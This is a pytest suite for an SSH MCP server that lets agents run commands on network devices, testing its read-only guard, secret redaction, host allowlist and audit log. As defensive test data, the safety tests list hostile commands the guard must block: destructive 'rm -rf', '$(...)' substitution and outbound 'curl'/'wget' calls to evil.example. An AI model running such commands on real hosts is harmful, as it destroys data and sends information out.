"""In-process tests for the SSH MCP server.

The scrapli connection is mocked at the tool import sites
(ssh_mcp.tools.read / ssh_mcp.tools.write), so no test ever opens a real SSH
session.
"""

from __future__ import annotations

import asyncio
import json
from contextlib import asynccontextmanager
from unittest.mock import patch

import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError

from ssh_mcp.connection import (
    SSHAuthError,
    SSHCommandError,
    SSHConnectError,
    SSHError,
    UnsupportedPlatformError,
    execute,
    open_connection,
)
from ssh_mcp.safety import check_read_only, redact
from ssh_mcp.server import _resolve_transport, build_server
from ssh_mcp.settings import CredentialProfile, Settings
from ssh_mcp.shell import ShellConnection

# --- fixtures / helpers ---------------------------------------------------


def make_settings(write_enabled: bool = False, audit_log: str | None = None) -> Settings:
    return Settings(
        write_enabled=write_enabled,
        credentials={"default": CredentialProfile(name="default", username="u", password="p")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
        # "off" keeps _build_driver unit tests from touching the filesystem.
        host_key_policy="off",
        audit_log=audit_log,
    )


class FakeResponse:
    def __init__(self, channel_input="", result="", failed=False):
        self.channel_input = channel_input
        self.result = result
        self.failed = failed
        self.elapsed_time = 0.01


class FakeDriver:
    def __init__(self, command_result="OK", failed=False, config_failed=False, raise_on_call=None):
        self._command_result = command_result
        self._failed = failed
        self._config_failed = config_failed
        self._raise_on_call = raise_on_call  # 1-based call index that raises
        self._calls = 0

    async def send_command(self, command):
        self._calls += 1
        if self._raise_on_call is not None and self._calls >= self._raise_on_call:
            raise OSError("connection reset by peer")
        return FakeResponse(channel_input=command, result=self._command_result, failed=self._failed)

    async def send_configs(self, commands, stop_on_failed=True):
        return [
            FakeResponse(channel_input=c, result="applied", failed=self._config_failed)
            for c in commands
        ]


def fake_open_connection(driver):
    @asynccontextmanager
    async def _open(*_args, **_kwargs):
        yield driver

    return _open


def failing_open_connection(exc):
    """An open_connection stand-in that raises `exc` on entry."""

    @asynccontextmanager
    async def _open(*_args, **_kwargs):
        raise exc
        yield  # type: ignore[unreachable]  # pragma: no cover — required for generator syntax

    return _open


# --- safety unit tests ----------------------------------------------------


def test_check_read_only_allows_diagnostics():
    assert check_read_only("show interfaces brief") is None
    assert check_read_only("display vlan") is None
    assert check_read_only("show running-config | include ntp") is None
    assert check_read_only("ip -br addr") is None


def test_check_read_only_blocks_destructive():
    assert check_read_only("reload") is not None
    assert check_read_only("configure terminal") is not None
    assert check_read_only("write memory") is not None
    assert check_read_only("show run ; reload") is not None
    assert check_read_only("cat /etc/passwd | rm -rf /tmp") is not None
    assert check_read_only("echo hi > /etc/hosts") is not None


def test_check_read_only_blocks_command_substitution():
    # Destructive verbs hidden inside $(...) or backticks must still be caught.
    assert check_read_only("echo $(reload)") is not None
    assert check_read_only("echo `erase startup-config`") is not None
    assert check_read_only("logger $(rm -rf /var)") is not None


def test_check_read_only_honours_extra_patterns():
    assert check_read_only("show forbidden-thing", ["forbidden-thing"]) is not None
    assert check_read_only("show interfaces", ["forbidden-thing"]) is None


def test_redact_strips_secrets():
    assert "SUPERSECRET" not in redact("snmp-server community SUPERSECRET ro")
    assert "<REDACTED>" in redact("username admin secret 5 abc123hash")
    assert "<REDACTED>" in redact("enable secret 5 deadbeef")


def test_redact_key_ciphertext():
    # Aruba CX form: the secret follows the ciphertext/plaintext keyword.
    out = redact("radius-server host 10.1.1.1 key ciphertext AQBapSECRETBLOB")
    assert "AQBapSECRETBLOB" not in out
    assert "<REDACTED>" in out
    assert "MyNtpSecret" not in redact("ntp key plaintext MyNtpSecret")


def test_redact_real_aruba_cx_config_shapes():
    """Redaction holds on the real AOS-CX running-config line shapes verified
    against a live switch — secret values here are fakes. Locks in coverage so
    a future regex change cannot silently start leaking one of these forms."""
    config = "\n".join(
        [
            "user admin group administrators password ciphertext FAKEuserPW",
            "radius-server tracking user-name radius-tracking-user password ciphertext FAKEtrackPW",
            "tacacs-server host 192.0.2.11 key ciphertext FAKEtacacsKEY",
            "radius-server host 192.0.2.11 key ciphertext FAKEradiusKEY "
            "tracking enable clearpass-username api-dur "
            "clearpass-password ciphertext FAKEclearpassPW",
            "radius dyn-authorization client 192.0.2.11 secret-key ciphertext FAKEdynKEY",
            "snmp-server community FAKEcommunity",
            "    neighbor 192.0.2.101 password ciphertext FAKEbgpPW",
        ]
    )
    out = redact(config)
    for secret in (
        "FAKEuserPW",
        "FAKEtrackPW",
        "FAKEtacacsKEY",
        "FAKEradiusKEY",
        "FAKEclearpassPW",
        "FAKEdynKEY",
        "FAKEcommunity",
        "FAKEbgpPW",
    ):
        assert secret not in out, f"{secret} leaked through redact()"


def test_strip_terminal_noise():
    from ssh_mcp.safety import strip_terminal_noise

    # The real VyOS 1.4.4 line shape: ESC= prefixes the output and ESC>
    # precedes the prompt (verified live against a real device).
    raw = "\x1b=Version:          VyOS 1.4.4\nRelease train:    sagitta\n\x1b>admin@vyos1:~$"
    out = strip_terminal_noise(raw)
    assert "\x1b" not in out
    assert out.startswith("Version:")
    assert out.endswith("admin@vyos1:~$")
    # Output with no escape sequences is returned unchanged.
    assert strip_terminal_noise("show version\nVyOS 1.4.4") == "show version\nVyOS 1.4.4"
    # CSI colour / cursor sequences are removed whole (not half-stripped).
    assert strip_terminal_noise("\x1b[31mred\x1b[0m") == "red"
    assert strip_terminal_noise("a\x1b[2J\x1b[Hb") == "ab"
    # OSC (window-title) sequences are removed.
    assert strip_terminal_noise("x\x1b]0;title\x07y") == "xy"
    # A literal '=' / '>' in real content (not preceded by ESC) is untouched.
    assert strip_terminal_noise("mtu >= 1500 = ok") == "mtu >= 1500 = ok"


# --- tool tests -----------------------------------------------------------


async def test_run_command_success():
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="GigabitEthernet1/0/1 is up")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show interfaces"},
            )
    payload = result.structured_content
    assert "GigabitEthernet" in payload["output"]
    assert payload["failed"] is False


async def test_run_command_rejects_destructive():
    mcp = build_server(make_settings())
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "reload"},
            )


async def test_run_command_output_is_redacted():
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="snmp-server community SUPERSECRET ro")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show running-config"},
            )
    out = result.structured_content["output"]
    assert "SUPERSECRET" not in out
    assert "<REDACTED>" in out


async def test_run_command_strips_terminal_noise():
    # ESC= / ESC> keypad-mode codes leaked by VyOS must not reach the agent.
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="\x1b=VyOS 1.4.4 running\x1b>host:~$")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {"host": "vyos1", "platform": "vyos", "command": "show version"},
            )
    out = result.structured_content["output"]
    assert "\x1b" not in out
    assert "VyOS 1.4.4 running" in out


async def test_run_commands_batch():
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "commands": ["show version", "show vlan brief"],
                },
            )
    payload = result.structured_content
    assert len(payload["results"]) == 2
    assert payload["failed"] is False


async def test_run_commands_partial_results_on_session_drop():
    mcp = build_server(make_settings())
    driver = FakeDriver(raise_on_call=2)  # 1st command ok, 2nd drops the session
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "commands": ["show version", "show vlan brief", "show run"],
                },
            )
    payload = result.structured_content
    # First succeeded, second errored, third never ran — partial results returned.
    assert len(payload["results"]) == 2
    assert payload["results"][0]["failed"] is False
    assert payload["results"][1]["failed"] is True
    assert payload["results"][1]["error"]
    assert payload["failed"] is True


async def test_run_command_session_error_raises():
    mcp = build_server(make_settings())
    driver = FakeDriver(raise_on_call=1)
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            with pytest.raises(ToolError):
                await client.call_tool(
                    "ssh_run_command",
                    {"host": "sw1", "platform": "cisco-iosxe", "command": "show version"},
                )


async def test_run_commands_rejects_if_any_destructive():
    mcp = build_server(make_settings())
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "commands": ["show version", "erase startup-config"],
                },
            )


async def test_write_tool_hidden_when_disabled():
    mcp = build_server(make_settings(write_enabled=False))
    names = {t.name for t in await mcp.list_tools()}
    assert "ssh_send_config" not in names
    assert "ssh_run_command" in names


async def test_write_tool_present_when_enabled():
    mcp = build_server(make_settings(write_enabled=True))
    names = {t.name for t in await mcp.list_tools()}
    assert "ssh_send_config" in names


async def test_send_config_applies():
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver()
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["interface Gi1/0/1", "description uplink"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is False
    assert len(payload["commands"]) == 2


async def test_send_config_rejects_bad_confirm():
    mcp = build_server(make_settings(write_enabled=True))
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["description test"],
                    "confirm": "no",
                },
            )


async def test_send_config_generic_platform_applies():
    # Generic/shell platforms (ProCurve, ArubaOS, Linux) take the per-command
    # loop, not scrapli config mode — every command is sent in order.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(command_result="applied")
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "aruba-os-switch",
                    "config_commands": ["vlan 100", "name TEST"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is False
    assert driver._calls == 2  # both commands ran over the shell


async def test_send_config_generic_stops_on_rejected():
    # A rejected command halts the apply — later commands must not run.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(failed=True)
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "aruba-os-switch",
                    "config_commands": ["bad command", "never runs"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is True
    assert driver._calls == 1  # stopped after the first rejected command


async def test_send_config_generic_save_note():
    # `save` does not apply to generic/linux hosts — it is reported, not run.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "host",
                    "platform": "linux",
                    "config_commands": ["echo hi"],
                    "confirm": "yes",
                    "save": True,
                },
            )
    payload = result.structured_content
    assert payload["saved"] is False
    assert "not applicable" in (payload["note"] or "")


async def test_send_config_generic_partial_on_session_drop():
    # A mid-apply session drop returns a partial result, not a bare error.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(raise_on_call=2)  # 1st applies, 2nd drops the session
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "aruba-os-switch",
                    "config_commands": ["vlan 100", "name TEST"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is True
    assert payload["note"] and "dropped" in payload["note"].lower()
    # The command applied before the drop is still reported.
    assert "vlan 100" in payload["output"]


async def test_all_tools_prefixed():
    mcp = build_server(make_settings(write_enabled=True))
    bad = [t.name for t in await mcp.list_tools() if not t.name.startswith("ssh_")]
    assert not bad, f"Unprefixed tools: {bad}"


async def test_server_version_resource():
    mcp = build_server(make_settings())
    async with Client(mcp) as client:
        result = await client.read_resource("server://version")
    assert "changelog" in result[0].text


async def test_unsupported_platform_raises():
    settings = make_settings()
    with pytest.raises(UnsupportedPlatformError):
        async with open_connection("host", "bogus-os", settings.get_profile("default"), settings):
            pass


def test_ssh_errors_are_tool_errors():
    # SSHError subclasses ToolError so messages reach the agent without
    # per-tool translation.
    for cls in (SSHError, SSHAuthError, SSHConnectError, UnsupportedPlatformError):
        assert issubclass(cls, ToolError)


async def test_check_reachable_success():
    mcp = build_server(make_settings())
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(FakeDriver())):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_check_reachable", {"host": "sw1", "platform": "linux"}
            )
    payload = result.structured_content
    assert payload["reachable"] is True
    assert payload["authenticated"] is True


async def test_check_reachable_auth_failure():
    mcp = build_server(make_settings())
    exc = SSHAuthError("SSH authentication failed for sw1: bad creds.")
    with patch("ssh_mcp.tools.read.open_connection", failing_open_connection(exc)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_check_reachable", {"host": "sw1", "platform": "linux"}
            )
    payload = result.structured_content
    # An auth failure means the host answered SSH — it is reachable.
    assert payload["reachable"] is True
    assert payload["authenticated"] is False
    assert payload["error"]


async def test_check_reachable_unreachable():
    mcp = build_server(make_settings())
    exc = SSHConnectError("Could not connect to sw1:22: timed out.")
    with patch("ssh_mcp.tools.read.open_connection", failing_open_connection(exc)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_check_reachable", {"host": "sw1", "platform": "linux"}
            )
    payload = result.structured_content
    assert payload["reachable"] is False
    assert payload["authenticated"] is False


# --- security hardening tests --------------------------------------------


def test_check_read_only_blocks_debug_and_pivot():
    # debug is state-changing and can DoS a router.
    assert check_read_only("debug all") is not None
    assert check_read_only("undebug all") is not None
    # Outbound connections turn the device into a pivot / exfil point.
    assert check_read_only("ssh root@10.0.0.9") is not None
    assert check_read_only("telnet 10.0.0.9") is not None
    assert check_read_only("scp file user@host:/tmp") is not None
    assert check_read_only("curl http://evil.example/x") is not None
    assert check_read_only("wget http://evil.example/x") is not None
    assert check_read_only("nc -l 4444") is not None
    # Legit diagnostics must still pass.
    assert check_read_only("show debugging") is None
    assert check_read_only("ping 8.8.8.8") is None
    assert check_read_only("traceroute 8.8.8.8") is None


async def test_execute_redacts_secret_in_error():
    # A secret inside a (write-mode) command must not leak into SSHCommandError.
    driver = FakeDriver(raise_on_call=1)
    with pytest.raises(SSHCommandError) as excinfo:
        await execute(driver, "snmp-server community SUPERSECRETCOMMUNITY ro")
    assert "SUPERSECRETCOMMUNITY" not in str(excinfo.value)
    assert "<REDACTED>" in str(excinfo.value)


async def test_send_config_redacts_echoed_commands():
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver()
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["snmp-server community SECRETWRITECOMM ro"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert "SECRETWRITECOMM" not in str(payload["commands"])


def test_resolve_transport_refuses_http_without_token(monkeypatch):
    monkeypatch.setenv("MCP_TRANSPORT", "http")
    monkeypatch.delenv("SSH_MCP_MCP_AUTH_TOKEN", raising=False)
    with pytest.raises(SystemExit):
        _resolve_transport()


def test_resolve_transport_allows_http_with_token(monkeypatch):
    monkeypatch.setenv("MCP_TRANSPORT", "http")
    monkeypatch.setenv("SSH_MCP_MCP_AUTH_TOKEN", "a-real-token")
    assert _resolve_transport() == "http"


def test_resolve_transport_stdio_default(monkeypatch):
    monkeypatch.delenv("MCP_TRANSPORT", raising=False)
    assert _resolve_transport() == "stdio"


# --- SSH key authentication tests ----------------------------------------


def test_load_settings_key_auth_shorthand(monkeypatch):
    monkeypatch.setenv("SSH_MCP_USERNAME", "automation")
    monkeypatch.delenv("SSH_MCP_PASSWORD", raising=False)
    monkeypatch.setenv("SSH_MCP_PRIVATE_KEY", "~/.ssh/id_ed25519")
    monkeypatch.setenv("SSH_MCP_PRIVATE_KEY_PASSPHRASE", "keypassphrase")
    monkeypatch.delenv("SSH_MCP_CREDENTIALS", raising=False)
    from ssh_mcp.settings import load_settings

    profile = load_settings().credentials["default"]
    assert profile.private_key == "~/.ssh/id_ed25519"
    assert profile.private_key_passphrase == "keypassphrase"
    assert profile.password == ""


def test_load_settings_key_auth_json(monkeypatch):
    monkeypatch.setenv(
        "SSH_MCP_CREDENTIALS",
        '{"keyauth":{"username":"auto","private_key":"/keys/id","private_key_passphrase":"pp"}}',
    )
    monkeypatch.delenv("SSH_MCP_USERNAME", raising=False)
    from ssh_mcp.settings import load_settings

    profile = load_settings().credentials["keyauth"]
    assert profile.private_key == "/keys/id"
    assert profile.private_key_passphrase == "pp"


def test_get_profile_requires_an_auth_method():
    settings = Settings(
        write_enabled=False,
        credentials={"noauth": CredentialProfile(name="noauth", username="u")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
    )
    with pytest.raises(ValueError):
        settings.get_profile("noauth")  # username but no password and no key


def test_get_profile_accepts_key_only():
    settings = Settings(
        write_enabled=False,
        credentials={"k": CredentialProfile(name="k", username="u", private_key="/k/id")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
    )
    assert settings.get_profile("k").private_key == "/k/id"


def test_build_driver_rejects_missing_key_file():
    from ssh_mcp.connection import _build_driver

    settings = make_settings()
    profile = CredentialProfile(name="k", username="u", private_key="/no/such/key/file/id_ed25519")
    with pytest.raises(ToolError):
        _build_driver("h", "linux", profile, settings, 22, 30.0)


def test_build_driver_accepts_key_file(tmp_path):
    from ssh_mcp.connection import _build_driver

    key = tmp_path / "id_test"
    key.write_text("dummy-private-key-material")
    settings = make_settings()
    profile = CredentialProfile(
        name="k",
        username="u",
        private_key=str(key),
        private_key_passphrase="pp",
    )
    driver = _build_driver("h", "linux", profile, settings, 22, 30.0)
    assert driver is not None


# --- TOFU host-key tests -------------------------------------------------


def test_ensure_known_hosts_file_creates(tmp_path):
    from ssh_mcp.hostkeys import ensure_known_hosts_file

    path = tmp_path / "sub" / "known_hosts"
    ensure_known_hosts_file(str(path))
    assert path.is_file()


def test_classify_host_key_new_known_changed(tmp_path):
    from ssh_mcp.hostkeys import append_host_key, classify_host_key

    kh = str(tmp_path / "kh")
    assert classify_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey1") == "new"
    append_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey1")
    assert classify_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey1") == "known"
    # Same host + same key type, different value → changed (the MITM signal).
    assert classify_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey2") == "changed"
    # Same host, a key type not yet recorded → new (accept-new).
    assert classify_host_key(kh, "sw1", "ssh-rsa", "AAAArsa") == "new"


def test_append_host_key_is_idempotent(tmp_path):
    from ssh_mcp.hostkeys import append_host_key

    kh = str(tmp_path / "kh")
    append_host_key(kh, "sw1", "ssh-ed25519", "AAAAk")
    append_host_key(kh, "sw1", "ssh-ed25519", "AAAAk")
    with open(kh) as fh:
        assert fh.read().count("sw1") == 1


def test_build_driver_tofu_creates_known_hosts(tmp_path):
    from ssh_mcp.connection import _build_driver

    kh = tmp_path / "kh"
    settings = Settings(
        write_enabled=False,
        credentials={},
        known_hosts=str(kh),
        timeout_socket=15.0,
        timeout_ops=30.0,
        host_key_policy="tofu",
    )
    driver = _build_driver(
        "h",
        "linux",
        CredentialProfile(name="d", username="u", password="p"),
        settings,
        22,
        30.0,
    )
    assert driver is not None
    assert kh.is_file()  # tofu ensured the pin store exists


def test_build_driver_strict_requires_existing_file(tmp_path):
    from ssh_mcp.connection import _build_driver

    settings = Settings(
        write_enabled=False,
        credentials={},
        known_hosts=str(tmp_path / "does-not-exist"),
        timeout_socket=15.0,
        timeout_ops=30.0,
        host_key_policy="strict",
    )
    with pytest.raises(ToolError):
        _build_driver(
            "h",
            "linux",
            CredentialProfile(name="d", username="u", password="p"),
            settings,
            22,
            30.0,
        )


# --- connection allowlist tests ------------------------------------------


def test_check_host_allowed():
    from ssh_mcp.safety import check_host_allowed

    assert check_host_allowed("anything", []) is None  # empty = allow all
    assert check_host_allowed("sw1.lab.example.com", ["*.lab.example.com"]) is None
    assert check_host_allowed("10.1.2.3", ["10.0.0.0/8"]) is None
    assert check_host_allowed("sw1", ["sw1"]) is None
    assert check_host_allowed("evil.com", ["*.lab.example.com"]) is not None
    assert check_host_allowed("192.168.1.1", ["10.0.0.0/8"]) is not None


async def test_open_connection_rejects_disallowed_host():
    settings = Settings(
        write_enabled=False,
        credentials={"default": CredentialProfile(name="default", username="u", password="p")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
        host_key_policy="off",
        allowed_hosts=["10.0.0.0/8"],
    )
    with pytest.raises(ToolError):
        async with open_connection("8.8.8.8", "linux", settings.get_profile("default"), settings):
            pass


# --- output cap tests ----------------------------------------------------


def test_cap_output():
    from ssh_mcp.safety import cap_output

    assert cap_output("short", 1000) == "short"
    big = "x" * 5000
    capped = cap_output(big, 1000)
    assert len(capped.encode()) < 5000
    assert "truncated" in capped
    assert cap_output(big, 0) == big  # 0 disables the cap


# --- ProCurve / ArubaOS-Switch raw-shell tests ---------------------------


class FakeStdout:
    """Async stdout for a fake PTY shell. Yields scripted chunks; afterwards it
    either reports EOF (closed session) or blocks (an open interactive shell)."""

    def __init__(self, chunks, *, eof_after=False):
        self._chunks = list(chunks)
        self._eof_after = eof_after
        self._eof = False

    async def read(self, _n):
        await asyncio.sleep(0)
        if self._chunks:
            return self._chunks.pop(0)
        if self._eof_after:
            self._eof = True
            return ""
        await asyncio.sleep(3600)  # open session: block until cancelled
        return ""

    def at_eof(self):
        return self._eof


class FakeStdin:
    def __init__(self):
        self.writes: list[str] = []

    def write(self, data):
        self.writes.append(data)


class FakeProcess:
    def __init__(self, chunks, *, eof_after=False):
        self.stdin = FakeStdin()
        self.stdout = FakeStdout(chunks, eof_after=eof_after)


class FakeConn:
    def __init__(self):
        self.closed = False

    def close(self):
        self.closed = True

    async def wait_closed(self):
        pass


class RecordingDriver:
    """Fake scrapli driver recording the lifecycle calls open_connection makes."""

    def __init__(self):
        self.events: list[str] = []

    async def open(self):
        self.events.append("open")

    async def close(self):
        self.events.append("close")


def test_shell_clean_trims_echo_and_prompt():
    from ssh_mcp.shell import _clean

    raw = "sw1# show system\r\nName : sw1\r\nUptime : 5d\r\nsw1# "
    assert _clean(raw, "show system") == "Name : sw1\nUptime : 5d"


def test_shell_clean_strips_ansi():
    from ssh_mcp.shell import _clean

    raw = "\x1b[2J\x1b[Hsw1# show ver\r\n\x1b[32mVersion 16.10\x1b[0m\r\nsw1#"
    out = _clean(raw, "show ver")
    assert "\x1b" not in out
    assert out == "Version 16.10"


def test_shell_clean_strips_arubaos_prompt():
    from ssh_mcp.shell import _clean

    # ArubaOS Mobility Controller / Conductor prompt variants on the last line.
    for prompt in ("(aruba-mc) #", "(aruba-mc) >", "(conductor) [mynode] *#"):
        raw = f"(aruba-mc) # show version\r\nArubaOS 8.10.0.4\r\n{prompt}"
        assert _clean(raw, "show version") == "ArubaOS 8.10.0.4"


def test_shell_clean_recovers_output_merged_with_echo():
    from ssh_mcp.shell import _clean

    # ProCurve streams the first output line straight onto the echo line — the
    # header must not be eaten with the echoed command.
    raw = "sw1# show flashImage   Size   Date\r\n---  ---  ---\r\nsw1# "
    out = _clean(raw, "show flash")
    assert out.startswith("Image   Size   Date")
    assert "---  ---  ---" in out
    assert "show flash" not in out


def test_shell_clean_recovers_error_merged_with_echo():
    from ssh_mcp.shell import _clean

    # A rejected command's error is merged onto the echo line — it must survive
    # so the device-error markers can flag failed=True.
    raw = "sw1# xyzzyInvalid input: xyzzy\r\nsw1# "
    assert _clean(raw, "xyzzy") == "Invalid input: xyzzy"


async def test_shell_send_command_drains_and_cleans():
    proc = FakeProcess(
        [
            "sw1# show system\r\n",
            "System Name : sw1\r\n",
            "sw1# ",
        ]
    )
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    resp = await sc.send_command("show system")
    await sc.close()
    assert resp.channel_input == "show system"
    assert resp.failed is False
    assert resp.result == "System Name : sw1"
    assert proc.stdin.writes == ["show system\n"]


async def test_shell_send_command_flags_device_error():
    proc = FakeProcess(["sw1# show bogus\r\n", "Invalid input: bogus\r\n", "sw1# "])
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    resp = await sc.send_command("show bogus")
    await sc.close()
    # An ArubaOS-Switch rejection marker sets failed=True.
    assert resp.failed is True
    assert "Invalid input: bogus" in resp.result


async def test_shell_send_command_raises_on_closed_session():
    proc = FakeProcess([], eof_after=True)
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    await asyncio.sleep(0.02)  # let the reader observe EOF
    with pytest.raises(ConnectionError):
        await sc.send_command("show system")
    await sc.close()


async def test_shell_drain_banner_runs_paging_command(monkeypatch):
    from ssh_mcp import shell as shell_mod

    monkeypatch.setattr(shell_mod, "_BANNER_QUIET", 0.05)
    monkeypatch.setattr(shell_mod, "_BANNER_OVERALL", 0.5)
    # ProCurve uses `no page`; ArubaOS Mobility Controllers use `no paging`.
    for paging in ("no page", "no paging"):
        proc = FakeProcess(["banner\r\n", "dev# ", f"{paging}\r\ndev# "])
        sc = ShellConnection(
            FakeConn(), proc, command_timeout=1.0, quiet=0.05, paging_command=paging
        )
        await sc.drain_banner()
        await sc.close()
        # A return dismisses the banner, then the platform's pager-off command.
        assert proc.stdin.writes == ["\n", f"{paging}\n"]


async def test_open_connection_uses_shell_path(monkeypatch):
    from ssh_mcp import connection

    class FakeShell:
        def __init__(self):
            self.closed = False

        async def close(self):
            self.closed = True

    settings = make_settings()
    # Both ProCurve and ArubaOS Mobility Controllers route to the raw PTY shell.
    for slug in ("aruba-os-switch", "aruba-os"):
        fake = FakeShell()
        captured: dict = {}

        async def fake_open_raw_shell(host, s, profile, st, port, ct, _fake=fake, _cap=captured):
            _cap["slug"] = s
            return _fake

        monkeypatch.setattr(connection, "_open_raw_shell", fake_open_raw_shell)
        async with connection.open_connection(
            "dev", slug, settings.get_profile("default"), settings
        ) as drv:
            assert drv is fake
        assert captured["slug"] == slug
        assert fake.closed is True


def test_paging_command_per_shell_platform():
    from ssh_mcp.connection import _PAGING_COMMANDS, _SHELL_PLATFORMS

    # Every shell platform has an explicit pager-disable command.
    assert set(_PAGING_COMMANDS) == _SHELL_PLATFORMS
    assert _PAGING_COMMANDS["aruba-os-switch"] == "no page"
    assert _PAGING_COMMANDS["aruba-os"] == "no paging"


async def test_open_connection_scrapli_path_for_linux(monkeypatch):
    from ssh_mcp import connection

    fake = RecordingDriver()
    monkeypatch.setattr(connection, "_build_driver", lambda **_kw: fake)
    settings = make_settings()
    async with connection.open_connection(
        "host", "linux", settings.get_profile("default"), settings
    ):
        pass
    # linux is not a shell platform — scrapli path: open then close.
    assert fake.events == ["open", "close"]


async def test_execute_wraps_shell_connection_error():
    # A dropped shell session must surface as SSHCommandError, like scrapli.
    proc = FakeProcess([], eof_after=True)
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    await asyncio.sleep(0.02)
    with pytest.raises(SSHCommandError):
        await execute(sc, "show version")
    await sc.close()


# --- new platform slug tests ---------------------------------------------


def test_build_driver_resolves_new_platforms():
    from ssh_mcp.connection import SUPPORTED_PLATFORMS, _build_driver

    settings = make_settings()
    profile = CredentialProfile(name="d", username="u", password="p")
    for slug in ("paloalto-panos", "huawei-vrp"):
        assert slug in SUPPORTED_PLATFORMS, f"{slug} missing from SUPPORTED_PLATFORMS"
        driver = _build_driver("h", slug, profile, settings, 22, 30.0)
        assert driver is not None


# --- audit logging tests -------------------------------------------------


def test_make_audit_sink_disabled():
    from ssh_mcp.audit import make_audit_sink

    # An empty/whitespace target disables auditing; a real target gives a sink.
    assert make_audit_sink(None) is None
    assert make_audit_sink("") is None
    assert make_audit_sink("   ") is None
    assert callable(make_audit_sink("/tmp/ssh-mcp-audit.jsonl"))


async def test_audit_log_records_tool_call(tmp_path):
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(audit_log=str(log)))
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show version"},
            )
    lines = log.read_text().splitlines()
    assert len(lines) == 1
    rec = json.loads(lines[0])
    assert rec["tool"] == "ssh_run_command"
    assert rec["host"] == "sw1"
    assert rec["platform"] == "cisco-iosxe"
    assert rec["commands"] == ["show version"]
    assert rec["outcome"] == "ok"
    assert rec["ts"] and rec["elapsed_s"] is not None


async def test_audit_log_records_denied_command(tmp_path):
